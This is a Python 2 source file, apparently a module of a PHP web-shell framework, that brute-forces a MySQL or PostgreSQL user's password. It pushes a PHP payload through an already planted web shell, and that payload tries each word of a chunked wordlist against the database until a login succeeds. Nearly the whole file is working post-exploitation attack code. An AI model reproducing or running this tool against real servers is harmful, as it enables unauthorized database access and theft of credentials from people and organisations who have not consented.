'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector
from random import choice
from math import ceil
from core.parameters import ParametersList, Parameter as P

classname = 'Sql'
 
class Sql(Module):
    '''Bruteforce sql user
    :bruteforce.sql mysql|postgres <host> <user> <local_file_list.txt> <start_line>|all
    '''
    
    vectors = VectorList([
            Vector('shell.php', 'brute_sql_php', """$m="%s"; $h="%s"; $u="%s"; $w=$_POST["%s"]; 
foreach(split('[\n]+',$w) as $pwd) {
if(@$m($h, $u, $pwd)){
print("+" . $u . ":" . $pwd . "\n");
break;
}
} 
""")
            ])

    params = ParametersList('Bruteforce single SQL user using a local wordlist', vectors,
            P(arg='dbms', help='DBMS', choices=['mysql', 'postgres'], required=True, pos=0),
            P(arg='user', help='SQL user to bruteforce', required=True, pos=1),
            P(arg='lpath', help='Path of local wordlist', required=True, pos=2),
            P(arg='sline', help='Start line of local wordlist', default='all', pos=3),
            P(arg='host', help='SQL host or host:port', default='127.0.0.1', pos=4))


    def __init__( self, modhandler , url, password):
        
        self.chunksize = 5000
        self.substitutive_wl = []
        Module.__init__(self, modhandler, url, password)
        
        
    def set_substitutive_wl(self, substitutive_wl=[]):
        """Cleaned after use"""
        self.substitutive_wl = substitutive_wl
        
        
    def run_module( self, mode, user, filename, start_line, host):

        if mode == 'mysql':
            sql_connect = "mysql_connect"
        elif mode == 'postgres':
            sql_connect = "pg_connect"
        else:
            raise ModuleException(self.name,  "Database '%s' unsupported" % (mode))

        if start_line == 'all':
            start_line = 0

        if 'localhost' not in host and '127.0.0.1' not in host:
            self.chunksize = 20

        if self.substitutive_wl:
            wl_splitted = self.substitutive_wl[:]
            self.substitutive_wl = []
        else:
            
            try:
                wordlist = open(filename, 'r')
            except Exception, e:
                raise ModuleException(self.name, "Error opening %s: %s" % (filename, str(e)))
    
            wl_splitted = [ w.strip() for w in wordlist.read().split() ]
            

        rand_post_name = ''.join([choice('abcdefghijklmnopqrstuvwxyz') for i in xrange(4)])

        vectors = self._get_default_vector2()
        if not vectors:
            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
        
        for vector in vectors:
            response = self.__execute_payload(vector, [sql_connect, host, user, rand_post_name, start_line, wl_splitted])
            if response != None:
                self.params.set_and_check_parameters({'vector' : vector.name})
                return response
                
        
    def __execute_payload(self, vector, parameters):
        
        rand_post_name = parameters[3]
        start_line = int(parameters[4])
        wl = parameters[5][start_line:]
        
        chunks = int(ceil(len(wl)/self.chunksize))
        
        if len(wl) > self.chunksize:
            self.mprint('[%s] Splitting wordlist of %i words in %i chunks of %i words.' % (self.name, len(wl), chunks+1, self.chunksize))

        
        for i in range(chunks+1):
        
            startword = i*self.chunksize
            if i == chunks:
                endword = len(wl)
            else:
                endword = (i+1)*self.chunksize
                
            joined_wl='\n'.join(wl[startword:endword])
        
            payload = self.__prepare_payload(vector, parameters[:-2]) 
            if vector.interpreter == 'shell.php':
                self.modhandler.load(vector.interpreter).set_post_data({rand_post_name : joined_wl})
            response = self.modhandler.load(vector.interpreter).run({ 0 : payload})
            
            if response:
                if response.startswith('+'):
                    return "[%s] FOUND! (%s)" % (self.name,response[1:])
            else:
                self.mprint("Try #%i: (%s:%s) ..." % (endword+start_line, parameters[2], wl[endword-1]))


    def __prepare_payload( self, vector, parameters ):

        if vector.payloads[0].count( '%s' ) == len(parameters):
            return vector.payloads[0] % tuple(parameters)
        else:
            raise ModuleException(self.name,  "Error payload parameter number does not corresponds")
        



    
    
    